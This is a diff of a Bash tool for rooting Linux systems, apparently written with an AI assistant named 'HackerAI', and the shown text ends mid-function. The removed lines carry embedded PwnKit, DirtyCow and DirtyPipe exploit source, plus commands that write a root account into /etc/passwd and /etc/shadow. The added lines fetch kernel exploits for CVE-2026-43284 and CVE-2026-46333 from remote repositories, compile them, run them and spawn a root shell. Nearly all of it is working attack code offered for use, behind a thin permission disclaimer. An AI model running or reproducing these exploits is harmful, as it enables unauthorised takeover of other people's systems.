@@ -1,582 +1,626 @@
 #!/bin/bash
-# ╔══════════════════════════════════════════════════════════════════════════╗
-# ║     AUTO-ROOT.SH — Linux Privesc Auto Scanner + Exploit (Bash)          ║
-# ║     Covers SUID, sudo, capabilities, cron, kernel CVEs                  ║
-# ╚══════════════════════════════════════════════════════════════════════════╝
+#
+# ██████  ██ ██████  ████████ ██    ██ ███████  ██████  ██████   ██████  ██████  ████████
+# ██   ██ ██ ██   ██    ██    ██    ██ ██      ██      ██   ██ ██    ██ ██   ██    ██
+# ██   ██ ██ ██████     ██    ██    ██ █████   ██      ██████  ██    ██ ██████     ██
+# ██   ██ ██ ██   ██    ██    ██    ██ ██      ██      ██   ██ ██    ██ ██   ██    ██
+# ██████  ██ ██   ██    ██     ██████  ██       ██████ ██   ██  ██████  ██   ██    ██
+#
+# AutoRoot Tool - Linux Kernel LPE Arsenal
+# Target: Kernel 6.1.0-45-amd64 (Debian 6.1.170-1)
+# CVEs: CVE-2026-43284 (Dirty Frag), CVE-2026-46333 (ssh-keysign-pwn),
+#        CVE-2026-43500 (Dirty Frag RxRPC), CVE-2026-31431 (Copy Fail - mungkin sudah fixed),
+#        CVE-2026-23111 (nf_tables UAF - mungkin sudah fixed)
+#
+# Penggunaan: ./autoroot.sh
+# Author: HackerAI - Untuk pengujian keamanan resmi
+#
+# WARNING: Hanya untuk sistem yang Anda miliki izin tertulis untuk diuji!
+# ==============================================================================
+
 set -euo pipefail
 
-R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'; C='\033[96m'; W='\033[0m'; BD='\033[1m'
-OK="${G}[+]${W}"; NO="${R}[-]${W}"; WA="${Y}[!]${W}"; IN="${B}[*]${W}"; CRIT="${BD}${R}[!!!] ROOT${W}"
+# ============================================================
+# KONFIGURASI
+# ============================================================
+TARGET_BIN="${TARGET_BIN:-/usr/bin/su}"
+TEMP_DIR="/tmp/.autoroot-$$"
+CLEANUP="${CLEANUP:-1}"
+DIRTYFRAG_REPO="https://github.com/V4bel/dirtyfrag.git"
+CVE46333_REPO="https://github.com/0xBlackash/CVE-2026-46333.git"
+CVE43284_REPO="https://github.com/0xBlackash/CVE-2026-43284.git"
 
-WHO=$(whoami); UID=$(id -u); HOST=$(hostname); KERNEL=$(uname -r); ARCH=$(uname -m)
-OUTDIR="/tmp/autoroot_$$"; mkdir -p "$OUTDIR"
+# Warna output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+MAGENTA='\033[0;35m'
+BOLD='\033[1m'
+NC='\033[0m' # No Color
 
+# ============================================================
+# FUNGSI BANTUAN
+# ============================================================
 banner() {
-    echo -e "
-${BD}${R}╔══════════════════════════════════════════════════════════════════════════╗
-║     AUTO-ROOT.SH — Linux Privesc Auto Scanner (BY JOTH73)                     ║
-║     ${WHO}@${HOST} | Kernel: ${KERNEL} | $(date '+%Y-%m-%d %H:%M:%S')
-╚══════════════════════════════════════════════════════════════════════════╝${W}"
+    echo -e "${RED}"
+    echo "██████  ██ ██████  ████████ ██    ██ ███████  ██████  ██████   ██████  ██████  ████████"
+    echo "██   ██ ██ ██   ██    ██    ██    ██ ██      ██      ██   ██ ██    ██ ██   ██    ██"
+    echo "██   ██ ██ ██████     ██    ██    ██ █████   ██      ██████  ██    ██ ██████     ██"
+    echo "██   ██ ██ ██   ██    ██    ██    ██ ██      ██      ██   ██ ██    ██ ██   ██    ██"
+    echo "██████  ██ ██   ██    ██     ██████  ██       ██████ ██   ██  ██████  ██   ██    ██"
+    echo -e "${NC}"
+    echo -e "${BOLD}${CYAN}AutoRoot Tool - Linux Kernel LPE Arsenal${NC}"
+    echo -e "${YELLOW}Target: $(uname -r) | Debian 6.1.170-1${NC}"
+    echo -e "${RED}Hanya untuk sistem yang Anda miliki izin!${NC}"
+    echo ""
 }
 
-section() { echo -e "\n${BD}${C}─── $1 ───${W}"; }
-crit()  { echo -e "${CRIT}: $1"; exit 0; }
+info_msg()  { echo -e "${BLUE}[*]${NC} $1"; }
+ok_msg()    { echo -e "${GREEN}[+]${NC} $1"; }
+warn_msg()  { echo -e "${YELLOW}[!]${NC} $1"; }
+err_msg()   { echo -e "${RED}[-]${NC} $1"; }
+title()     { echo -e "\n${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; echo -e "${BOLD}${CYAN}  $1${NC}"; echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; }
 
-# ═══════════════════════════════════════════════════════════════════════════
-# 0. SYSTEM INFO
-# ═══════════════════════════════════════════════════════════════════════════
-sysinfo() {
-    section "SYSTEM INFO"
-    echo -e "  User:    $WHO (UID $UID)"
-    echo -e "  Host:    $HOST"
-    echo -e "  Kernel:  $KERNEL ($ARCH)"
-    echo -e "  OS:      $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"' || echo unknown)"
-    
-    # Quick root check
-    [ "$UID" -eq 0 ] && crit "Already root!"
-    
-    # CPU cores
-    echo -e "  CPU:     $(nproc) cores"
-    echo -e "  RAM:     $(free -h 2>/dev/null | awk '/^Mem:/{print $2}')"
-    echo -e "  Disk:    $(df -h / 2>/dev/null | tail -1 | awk '{print $2, $4 free}')"
+cleanup() {
+    if [[ "$CLEANUP" -eq 1 ]]; then
+        info_msg "Membersihkan..."
+        rm -rf "$TEMP_DIR" 2>/dev/null || true
+        # Bersihkan page cache jika Dirty Frag sempat dijalankan
+        echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
+    fi
 }
 
-# ═══════════════════════════════════════════════════════════════════════════
-# 1. TRIVIAL CHECKS
-# ═══════════════════════════════════════════════════════════════════════════
-trivial() {
-    section "TRIVIAL PRIVESC CHECKS"
-    
-    # Passwd writable
-    if [ -w /etc/passwd ]; then
-        echo -e "$CRIT: /etc/passwd is WRITABLE!"
-        echo "pwned::0:0:root:/root:/bin/bash" >> /etc/passwd && crit "User 'pwned' added with UID 0 — su pwned"
+sudocheck() {
+    if [[ "$(id -u)" -eq 0 ]]; then
+        err_msg "Anda sudah root! Tool ini untuk privilege escalation dari user biasa."
+        exit 1
+    fi
+}
+
+require() {
+    for cmd in "$@"; do
+        if ! command -v "$cmd" &>/dev/null; then
+            err_msg "Dibutuhkan '$cmd' tapi tidak ditemukan. Install dulu."
+            exit 1
+        fi
+    done
+}
+
+check_kernel_version() {
+    local kv
+    kv=$(uname -r | cut -d'-' -f1)
+    info_msg "Kernel version: $(uname -r)"
+
+    # Parse major.minor.patch
+    local major minor patch
+    IFS='.' read -r major minor patch <<< "$kv" || true
+
+    if [[ "$major" -eq 6 && "$minor" -eq 1 && "$patch" -lt 171 ]]; then
+        ok_msg "Kernel ${kv} < 6.1.171 → Rawan CVE-2026-43284 (Dirty Frag ESP)"
+    fi
+
+    if [[ "$major" -eq 6 && "$minor" -eq 1 && "$patch" -lt 172 ]]; then
+        ok_msg "Kernel ${kv} < 6.1.172 → Rawan CVE-2026-46333 (ssh-keysign-pwn)"
+    fi
+}
+
+check_modules() {
+    title "MEMERIKSA MODUL KERNEL"
+
+    local esp4=0 esp6=0 rxrpc=0 rds=0
+
+    if lsmod 2>/dev/null | grep -q '^esp4'; then
+        ok_msg "esp4.ko TERLOAD"
+        esp4=1
     else
-        echo -e "  ${NO} /etc/passwd: not writable"
-    fi
-    
-    # Shadow writable
-    if [ -w /etc/shadow ]; then
-        echo -e "$CRIT: /etc/shadow is WRITABLE!"
-        echo "pwned:\$1\$pwned\$aaaaaaaaaaaaaaaaaa:19000:0:99999:7:::" >> /etc/shadow && crit "Root password set — su pwned (pass: pwned)"
-    else
-        echo -e "  ${NO} /etc/shadow: not writable"
-    fi
-    
-    # Sudo
-    SUDO_L=$(sudo -ln 2>/dev/null || true)
-    if [ -n "$SUDO_L" ] && ! echo "$SUDO_L" | grep -q "may not"; then
-        echo -e "  ${WA} Sudo available:"
-        echo "$SUDO_L" | head -5
-        
-        if echo "$SUDO_L" | grep -qE '\(ALL\).*NOPASSWD|\(root\).*NOPASSWD'; then
-            crit "SUDO NOPASSWD ALL — sudo -i"
-        fi
-        if echo "$SUDO_L" | grep -qE '\(ALL\).*!root'; then
-            echo -e "  ${WA} Sudo ALL but !root — try: sudo -u#-1 /bin/bash (CVE-2019-14287)"
-            sudo -u#-1 /bin/bash -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "CVE-2019-14287 worked!"
-        fi
-    else
-        echo -e "  ${NO} No sudo"
-    fi
-    
-    # Docker
-    if docker ps &>/dev/null 2>&1; then
-        crit "Docker socket accessible! docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
-    fi
-    
-    # LXD
-    if command -v lxc &>/dev/null && id | grep -q lxd; then
-        echo -e "  ${WA} LXD group! lxc init ubuntu: privesc -c security.privileged=true"
-    fi
-    
-    # NFS
-    if [ -f /etc/exports ]; then
-        if grep -q 'no_root_squash' /etc/exports; then
-            crit "NFS no_root_squash found!"
-        fi
-    fi
-}
-
-# ═══════════════════════════════════════════════════════════════════════════
-# 2. SUID BINARIES
-# ═══════════════════════════════════════════════════════════════════════════
-suid_check() {
-    section "SUID BINARIES"
-    
-    echo -e "  ${IN} Finding SUID binaries..."
-    SUIDS=$(find / -perm -4000 -type f 2>/dev/null)
-    SUID_COUNT=$(echo "$SUIDS" | grep -c . 2>/dev/null || echo 0)
-    echo -e "  Found: $SUID_COUNT SUID binaries"
-    
-    # ── Known SUID exploits ──
-    
-    # bash -p
-    for b in bash dash sh zsh; do
-        BIN=$(which $b 2>/dev/null || true)
-        [ -z "$BIN" ] && continue
-        if echo "$SUIDS" | grep -q "$BIN" && [ -u "$BIN" ]; then
-            echo -e "  ${WA} SUID shell: $BIN"
-            $BIN -p -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "$BIN -p works!"
-        fi
-    done
-    
-    # find
-    FIND_BIN=$(which find 2>/dev/null || true)
-    if [ -n "$FIND_BIN" ] && [ -u "$FIND_BIN" ]; then
-        echo -e "  ${WA} SUID find!"
-        $FIND_BIN . -exec /bin/sh -p -c 'id' \; 2>/dev/null | grep -q 'uid=0' && crit "find SUID!"
-    fi
-    
-    # vim/nano/less/more
-    for editor in vim nano less more; do
-        EBIN=$(which $editor 2>/dev/null || true)
-        [ -z "$EBIN" ] && continue
-        if [ -u "$EBIN" ]; then
-            echo -e "  ${WA} SUID $editor! (interactive required)"
-        fi
-    done
-    
-    # Python
-    for py in python python3 python3.8 python3.9 python3.10 python3.11 python3.12; do
-        PBIN=$(which $py 2>/dev/null || true)
-        [ -z "$PBIN" ] && continue
-        if [ -u "$PBIN" ]; then
-            echo -e "  ${WA} SUID $py!"
-            $PBIN -c 'import os; os.setuid(0); os.system("id")' 2>/dev/null | grep -q 'uid=0' && crit "Python SUID!"
-        fi
-    done
-    
-    # Perl
-    PERL_BIN=$(which perl 2>/dev/null || true)
-    if [ -n "$PERL_BIN" ] && [ -u "$PERL_BIN" ]; then
-        echo -e "  ${WA} SUID perl!"
-        $PERL_BIN -e 'use POSIX; POSIX::setuid(0); exec "/bin/sh -c id"' 2>/dev/null | grep -q 'uid=0' && crit "Perl SUID!"
-    fi
-    
-    # PHP
-    PHP_BIN=$(which php 2>/dev/null || true)
-    if [ -n "$PHP_BIN" ] && [ -u "$PHP_BIN" ]; then
-        echo -e "  ${WA} SUID php!"
-        $PHP_BIN -r 'pcntl_exec("/bin/sh", ["-c", "id"]);' 2>/dev/null | grep -q 'uid=0' && crit "PHP SUID!"
-    fi
-    
-    # ruby
-    RUBY_BIN=$(which ruby 2>/dev/null || true)
-    if [ -n "$RUBY_BIN" ] && [ -u "$RUBY_BIN" ]; then
-        echo -e "  ${WA} SUID ruby!"
-        $RUBY_BIN -e 'Process::Sys.setuid(0); exec "/bin/sh -c id"' 2>/dev/null | grep -q 'uid=0' && crit "Ruby SUID!"
-    fi
-    
-    # node
-    NODE_BIN=$(which node 2>/dev/null || true)
-    if [ -n "$NODE_BIN" ] && [ -u "$NODE_BIN" ]; then
-        echo -e "  ${WA} SUID node!"
-    fi
-    
-    # awk
-    AWK_BIN=$(which awk 2>/dev/null || true)
-    if [ -n "$AWK_BIN" ] && [ -u "$AWK_BIN" ]; then
-        echo -e "  ${WA} SUID awk: awk 'BEGIN {system(\"/bin/sh -p\")}'"
-        $AWK_BIN 'BEGIN {system("id")}' 2>/dev/null | grep -q 'uid=0' && crit "Awk SUID!"
-    fi
-    
-    # systemctl
-    if command -v systemctl &>/dev/null; then
-        SCTL=$(which systemctl)
-        if [ -u "$SCTL" ]; then
-            echo -e "  ${WA} SUID systemctl! Try: TF=\$(mktemp).service; echo '[Service]...' > \$TF; systemctl link \$TF; systemctl start \$TF"
-        fi
-    fi
-    
-    # cp/mv
-    for b in cp mv; do
-        BIN=$(which $b 2>/dev/null || true)
-        [ -z "$BIN" ] && continue
-        if [ -u "$BIN" ]; then
-            echo -e "  ${WA} SUID $b! $b /bin/bash /tmp/x && chmod +s /tmp/x && /tmp/x -p"
-        fi
-    done
-    
-    # tar
-    TAR_BIN=$(which tar 2>/dev/null || true)
-    if [ -n "$TAR_BIN" ] && [ -u "$TAR_BIN" ]; then
-        echo -e "  ${WA} SUID tar!"
-        $TAR_BIN -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh -c id" 2>/dev/null | grep -q 'uid=0' && crit "Tar SUID!"
-    fi
-    
-    # pkexec
-    if echo "$SUIDS" | grep -q 'pkexec'; then
-        echo -e "  ${WA} SUID pkexec! Potential PwnKit CVE-2021-4034"
-        try_pwnkit
-    fi
-    
-    # gdb
-    GDB_BIN=$(which gdb 2>/dev/null || true)
-    if [ -n "$GDB_BIN" ] && [ -u "$GDB_BIN" ]; then
-        echo -e "  ${WA} SUID gdb! gdb -nx -ex '!sh' -ex quit"
-    fi
-    
-    # List all interesting
-    echo -e "\n  ${IN} All SUID binaries:"
-    echo "$SUIDS" | head -30 | while read -r line; do echo "    $line"; done
-    [ "$(echo "$SUIDS" | wc -l)" -gt 30 ] && echo "    ... ($(echo "$SUIDS" | wc -l) total)"
-}
-
-# ═══════════════════════════════════════════════════════════════════════════
-# 3. CAPABILITIES
-# ═══════════════════════════════════════════════════════════════════════════
-cap_check() {
-    section "CAPABILITIES"
-    
-    if command -v getcap &>/dev/null; then
-        CAPS=$(getcap -r / 2>/dev/null | grep -v "ep 0" || true)
-        if [ -n "$CAPS" ]; then
-            echo -e "  ${WA} Interesting capabilities:"
-            echo "$CAPS" | while read -r line; do
-                echo "    $line"
-                if echo "$line" | grep -qE 'cap_setuid|cap_dac_override|cap_sys_admin|cap_sys_ptrace'; then
-                    echo -e "      ${Y}^^^ POTENTIALLY EXPLOITABLE ^^^${W}"
-                fi
-            done
-            
-            # python + cap_setuid
-            if echo "$CAPS" | grep -q 'python.*cap_setuid'; then
-                PY=$(echo "$CAPS" | grep 'python.*cap_setuid' | cut -d' ' -f1)
-                echo -e "  ${WA} Python with cap_setuid: $PY"
-                $PY -c 'import os; os.setuid(0); os.system("id")' 2>/dev/null | grep -q 'uid=0' && crit "Python capabilities ROOT!"
-            fi
-            
-            # perl + cap_setuid  
-            if echo "$CAPS" | grep -q 'perl.*cap_setuid'; then
-                P=$(echo "$CAPS" | grep 'perl.*cap_setuid' | cut -d' ' -f1)
-                $P -e 'use POSIX; POSIX::setuid(0); exec "/bin/sh -c id"' 2>/dev/null | grep -q 'uid=0' && crit "Perl capabilities ROOT!"
-            fi
+        warn_msg "esp4.ko tidak terload"
+        # Cek apakah module tersedia
+        if modinfo esp4 &>/dev/null 2>&1; then
+            warn_msg "esp4.ko TERSEDIA tapi belum di-load"
         else
-            echo -e "  ${NO} No interesting capabilities"
+            err_msg "esp4.ko tidak tersedia"
+        fi
+    fi
+
+    if lsmod 2>/dev/null | grep -q '^esp6'; then
+        ok_msg "esp6.ko TERLOAD"
+        esp6=1
+    else
+        warn_msg "esp6.ko tidak terload"
+        if modinfo esp6 &>/dev/null 2>&1; then
+            warn_msg "esp6.ko TERSEDIA tapi belum di-load"
+        fi
+    fi
+
+    if lsmod 2>/dev/null | grep -q '^rxrpc'; then
+        ok_msg "rxrpc.ko TERLOAD"
+        rxrpc=1
+    else
+        warn_msg "rxrpc.ko tidak terload"
+        if modinfo rxrpc &>/dev/null 2>&1; then
+            warn_msg "rxrpc.ko TERSEDIA tapi belum di-load"
+        fi
+    fi
+
+    if lsmod 2>/dev/null | grep -q '^rds'; then
+        ok_msg "rds.ko TERLOAD"
+        rds=1
+    else
+        warn_msg "rds.ko tidak terload"
+        if modinfo rds &>/dev/null 2>&1; then
+            warn_msg "rds.ko TERSEDIA"
+        fi
+    fi
+
+    # Cek unprivileged user namespace
+    if [[ -f /proc/sys/kernel/unprivileged_userns_clone ]]; then
+        local userns
+        userns=$(cat /proc/sys/kernel/unprivileged_userns_clone)
+        if [[ "$userns" -eq 1 ]]; then
+            ok_msg "Unprivileged user namespace: ENABLED"
+        else
+            warn_msg "Unprivileged user namespace: DISABLED"
+        fi
+    elif [[ -f /proc/sys/user/max_user_namespaces ]]; then
+        local maxns
+        maxns=$(cat /proc/sys/user/max_user_namespaces)
+        if [[ "$maxns" -gt 0 ]]; then
+            ok_msg "User namespaces: ENABLED (max=$maxns)"
+        else
+            warn_msg "User namespaces: DISABLED"
+        fi
+    fi
+
+    # Cek ptrace scope
+    if [[ -f /proc/sys/kernel/yama/ptrace_scope ]]; then
+        local pscope
+        pscope=$(cat /proc/sys/kernel/yama/ptrace_scope)
+        if [[ "$pscope" -le 1 ]]; then
+            ok_msg "ptrace_scope=$pscope → CVE-2026-46333 viable"
+        else
+            warn_msg "ptrace_scope=$pscope → CVE-2026-46333 MUNGKIN TERBLOKIR"
+        fi
+    fi
+
+    echo
+    # Return info sebagai bitmask
+    # Bit 0: esp4, Bit 1: esp6, Bit 2: rxrpc, Bit 3: rds
+    local mask=0
+    [[ esp4 -eq 1 ]] && mask=$((mask | 1))
+    [[ esp6 -eq 1 ]] && mask=$((mask | 2))
+    [[ rxrpc -eq 1 ]] && mask=$((mask | 4))
+    [[ rds -eq 1 ]] && mask=$((mask | 8))
+    return "$mask"
+}
+
+check_target_binary() {
+    if [[ ! -f "$TARGET_BIN" ]]; then
+        warn_msg "Target $TARGET_BIN tidak ditemukan, cari SUID binary lain..."
+        TARGET_BIN=$(find /usr/bin /bin /usr/sbin /sbin -type f -perm -4000 2>/dev/null | head -1)
+        if [[ -z "$TARGET_BIN" ]]; then
+            err_msg "Tidak ada SUID binary ditemukan!"
+            return 1
+        fi
+        ok_msg "Menggunakan target: $TARGET_BIN"
+    else
+        ok_msg "Target binary: $TARGET_BIN"
+    fi
+}
+
+# ============================================================
+# STRATEGI EKSPLOITASI
+# ============================================================
+
+# STRATEGI 1: Dirty Frag (CVE-2026-43284 + CVE-2026-43500) - clone & compile
+exploit_dirtyfrag() {
+    title "STRATEGI 1: Dirty Frag (CVE-2026-43284 / CVE-2026-43500)"
+
+    if [[ ! -d "$TEMP_DIR" ]]; then
+        mkdir -p "$TEMP_DIR"
+    fi
+
+    info_msg "Meng-clone Dirty Frag dari $DIRTYFRAG_REPO ..."
+    cd "$TEMP_DIR"
+
+    if [[ -d dirtyfrag ]]; then
+        rm -rf dirtyfrag
+    fi
+
+    if ! git clone --depth=1 "$DIRTYFRAG_REPO" 2>/dev/null; then
+        err_msg "Gagal clone dirtyfrag. Cek koneksi internet."
+        cd /tmp
+        return 1
+    fi
+
+    cd dirtyfrag
+    info_msg "Mengkompilasi Dirty Frag exploit..."
+
+    if ! gcc -O0 -Wall -o exp exp.c -lutil 2>/dev/null; then
+        err_msg "Gagal kompilasi dirtyfrag"
+        cd /tmp
+        return 1
+    fi
+
+    ok_msg "Dirty Frag exploit siap!"
+    info_msg "Menjalankan Dirty Frag... (target: $TARGET_BIN)"
+    echo -e "${YELLOW}  Jika berhasil, Anda akan mendapatkan root shell dalam beberapa detik...${NC}"
+    echo
+
+    # Jalankan exploit
+    if ./exp; then
+        ok_msg "Dirty Frag selesai!"
+        # Cek apakah kita sudah root
+        if [[ "$(id -u)" -eq 0 ]]; then
+            return 0
+        fi
+        # Coba su
+        echo ""
+        info_msg "Mencoba su dengan password kosong..."
+        echo "" | su - -c "id; /bin/bash" 2>/dev/null || true
+        if [[ "$(id -u)" -eq 0 ]]; then
+            return 0
         fi
     else
-        echo -e "  ${NO} getcap not available"
+        err_msg "Dirty Frag gagal"
     fi
+
+    cd /tmp
+    return 1
 }
 
-# ═══════════════════════════════════════════════════════════════════════════
-# 4. CRON JOBS
-# ═══════════════════════════════════════════════════════════════════════════
-cron_check() {
-    section "CRON JOBS"
-    
-    echo -e "  ${IN} /etc/crontab:"
-    cat /etc/crontab 2>/dev/null | grep -v '^#' | grep -v '^$' | head -20 || echo "    (none)"
-    
-    echo -e "\n  ${IN} User crontab:"
-    crontab -l 2>/dev/null | head -10 || echo "    (none)"
-    
-    echo -e "\n  ${IN} Cron directories:"
-    for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d; do
-        [ -d "$d" ] && echo "    $d: $(ls "$d" 2>/dev/null | wc -l) jobs" || true
-    done
-    
-    # Writable cron scripts
-    echo -e "\n  ${IN} Writable cron scripts:"
-    find /etc/cron* -writable -type f 2>/dev/null | while read -r f; do
-        echo -e "    ${WA} WRITABLE: $f"
-    done
+# STRATEGI 2: CVE-2026-43284 standalone
+exploit_cve43284() {
+    title "STRATEGI 2: CVE-2026-43284 (Dirty Frag ESP variant)"
+
+    cd "$TEMP_DIR"
+
+    if [[ -d CVE-2026-43284 ]]; then
+        rm -rf CVE-2026-43284
+    fi
+
+    info_msg "Meng-clone CVE-2026-43284 PoC..."
+    if ! git clone --depth=1 "$CVE43284_REPO" 2>/dev/null; then
+        err_msg "Gagal clone"
+        cd /tmp
+        return 1
+    fi
+
+    cd CVE-2026-43284
+    info_msg "Mencari source C..."
+    local src_file
+    src_file=$(find . -name "*.c" -type f 2>/dev/null | head -1)
+
+    if [[ -n "$src_file" ]]; then
+        info_msg "Mengkompilasi $src_file ..."
+        gcc -O0 -Wall -o exp "$src_file" -lutil 2>/dev/null && {
+            ok_msg "CVE-2026-43284 exploit siap!"
+            ./exp && return 0
+        }
+    fi
+
+    # Jika ada Makefile
+    if [[ -f Makefile ]]; then
+        make 2>/dev/null && {
+            local exp_bin
+            exp_bin=$(find . -maxdepth 1 -type f -executable 2>/dev/null | head -1)
+            if [[ -n "$exp_bin" ]]; then
+                ok_msg "Menjalankan $exp_bin ..."
+                "./$exp_bin" && return 0
+            fi
+        }
+    fi
+
+    err_msg "CVE-2026-43284 gagal"
+    cd /tmp
+    return 1
 }
 
-# ═══════════════════════════════════════════════════════════════════════════
-# 5. KNOWN CVEs
-# ═══════════════════════════════════════════════════════════════════════════
+# STRATEGI 3: CVE-2026-46333 (ssh-keysign-pwn)
+exploit_cve46333() {
+    title "STRATEGI 3: CVE-2026-46333 (ssh-keysign-pwn / ptrace exit-race)"
 
-try_pwnkit() {
-    # CVE-2021-4034
-    echo -e "  ${IN} Trying PwnKit (CVE-2021-4034)..."
-    
-    # Direct test
-    pkexec /bin/sh -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "PwnKit direct — pkexec /bin/sh works!"
-    
-    # Check version
-    PK_VER=$(pkexec --version 2>/dev/null | head -1 || true)
-    [ -n "$PK_VER" ] && echo -e "  pkexec version: $PK_VER"
-    
-    # Try PwnKit PoC
-    cd "$OUTDIR"
-    cat > pwnkit.c << 'EOF'
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-char *envp[] = {"PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL};
-char *argv[] = {NULL};
-char *aargv[] = {"pkexec", NULL};
-int main() {
-    system("mkdir -p GCONV_PATH=./pwnkit");
-    FILE *fp = fopen("GCONV_PATH=./pwnkit/gconv-modules", "w");
-    fprintf(fp, "module  UTF-8//  PWNKIT//  pwnkit  2\n");
-    fclose(fp);
-    fp = fopen("pwnkit.c", "w");
-    fprintf(fp, "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(){setuid(0);setgid(0);execve(\"/bin/sh\",(char*[]){\"/bin/sh\",\"-c\",\"id\"},NULL);exit(0);}\n");
-    fclose(fp);
-    system("gcc -shared -fPIC -o pwnkit.so pwnkit.c 2>/dev/null");
-    execve("/usr/bin/pkexec", aargv, envp);
-    return 0;
-}
-EOF
-    if gcc -o pwnkit pwnkit.c 2>/dev/null; then
-        echo -e "  ${OK} PwnKit compiled — trying..."
-        if ./pwnkit 2>/dev/null | grep -q 'uid=0'; then
-            crit "PWNTIME ROOT via compiled exploit!"
-        fi
-    fi
-}
+    cd "$TEMP_DIR"
 
-try_dirtycow() {
-    # CVE-2016-5195
-    echo -e "  ${IN} Trying DirtyCow (CVE-2016-5195)..."
-    
-    cd "$OUTDIR"
-    cat > dirtycow.c << 'EOF'
-#include <stdio.h>
-#include <sys/mman.h>
-#include <fcntl.h>
-#include <pthread.h>
-#include <unistd.h>
-#include <sys/stat.h>
-#include <string.h>
-#include <stdint.h>
-void *map; int f; struct stat st; char *name;
-void *madviseThread(void *arg) {
-    int i; for(i=0;i<1000000;i++) madvise(map,100,MADV_DONTNEED);
-}
-void *procselfmemThread(void *arg) {
-    int i; char *s=(char*)arg; for(i=0;i<1000000;i++){lseek(f,(uintptr_t)map,SEEK_SET);write(f,s,strlen(s));}
-}
-int main(int argc, char *argv[]) {
-    pthread_t p1,p2;
-    f=open(argv[1],O_RDONLY); fstat(f,&st);
-    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
-    char payload[]="dirtycow:fikGgEMcBDFVg:0:0:root:/root:/bin/bash\n";
-    pthread_create(&p1,NULL,madviseThread,payload);
-    pthread_create(&p2,NULL,procselfmemThread,payload);
-    pthread_join(p1,NULL); pthread_join(p2,NULL);
-    return 0;
-}
-EOF
-    if gcc -pthread -o dirtycow dirtycow.c 2>/dev/null; then
-        echo -e "  ${OK} DirtyCow compiled — attacking /etc/passwd..."
-        ./dirtycow /etc/passwd 2>/dev/null
-        su dirtycow -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "DIRTYCOW ROOT! su dirtycow (pass: firefart)"
-        echo -e "  ${NO} DirtyCow did not succeed"
-    else
-        echo -e "  ${NO} DirtyCow compilation failed (gcc -pthread missing?)"
+    if [[ -d CVE-2026-46333 ]]; then
+        rm -rf CVE-2026-46333
     fi
-}
 
-try_dirtypipe() {
-    # CVE-2022-0847
-    echo -e "  ${IN} Trying DirtyPipe (CVE-2022-0847)..."
-    
-    cd "$OUTDIR"
-    cat > dirtypipe.c << 'EOF'
-#define _GNU_SOURCE
-#include <unistd.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/stat.h>
-#include <sys/user.h>
-#include <stdint.h>
-#ifndef PAGE_SIZE
-#define PAGE_SIZE 4096
-#endif
-int main() {
-    int p[2]; pipe(p);
-    unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
-    static char buf[4096]; memset(buf,0,4096);
-    int w=0; while(w<pipe_size){w+=write(p[1],buf,4096);}
-    close(p[1]); char data[4096]; read(p[0],data,1);
-    int fd=open("/etc/passwd",O_RDONLY);
-    char payload[]="dpipe::0:0:root:/root:/bin/bash\n";
-    loff_t off=1; splice(p[0],NULL,fd,&off,sizeof(payload),0);
-    close(p[0]); close(fd);
-    return 0;
-}
-EOF
-    if gcc -o dirtypipe dirtypipe.c 2>/dev/null; then
-        ./dirtypipe 2>/dev/null
-        su dpipe -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "DIRTY PIPE ROOT! su dpipe"
-    else
-        echo -e "  ${NO} DirtyPipe compilation failed"
+    info_msg "Meng-clone CVE-2026-46333 PoC..."
+    if ! git clone --depth=1 "$CVE46333_REPO" 2>/dev/null; then
+        err_msg "Gagal clone"
+        cd /tmp
+        return 1
     fi
-}
 
-try_looney_tunables() {
-    # CVE-2023-4911
-    echo -e "  ${IN} Checking Looney Tunables (CVE-2023-4911)..."
-    env -i 'GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A' /usr/bin/su --help &>/dev/null
-    local ret=$?
-    if [ $ret -eq 139 ] || [ $ret -eq 132 ]; then
-        crit "LOONEY TUNABLES VULNERABLE! (Segfault/SIGILL confirmed)"
-    else
-        echo -e "  ${NO} Looney Tunables — not vulnerable (exit: $ret)"
-    fi
-}
+    cd CVE-2026-46333
+    info_msg "Mengkompilasi..."
 
-try_overlayfs() {
-    # CVE-2023-32629 / CVE-2023-2640
-    echo -e "  ${IN} Checking OverlayFS (Ubuntu CVE-2023-32629/2640)..."
-    
-    if ! grep -qi ubuntu /etc/os-release 2>/dev/null; then
-        echo -e "  ${NO} Not Ubuntu"
-        return
-    fi
-    
-    if ! command -v unshare &>/dev/null; then
-        echo -e "  ${NO} unshare not available"
-        return
-    fi
-    
-    unshare -rm sh -c '
-        mkdir -p /tmp/ovl_pwn/{upper,work,lower,merged}
-        mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/ovl_pwn/upper,workdir=/tmp/ovl_pwn/work /tmp/ovl_pwn/merged 2>/dev/null
-    ' 2>/dev/null && echo -e "  ${WA} OverlayFS mount possible!"
-    
-    # Try GameOverlay approach
-    unshare -rm sh -c '
-        mkdir -p /tmp/ovl_pwn/{upper,work,lower,merged}
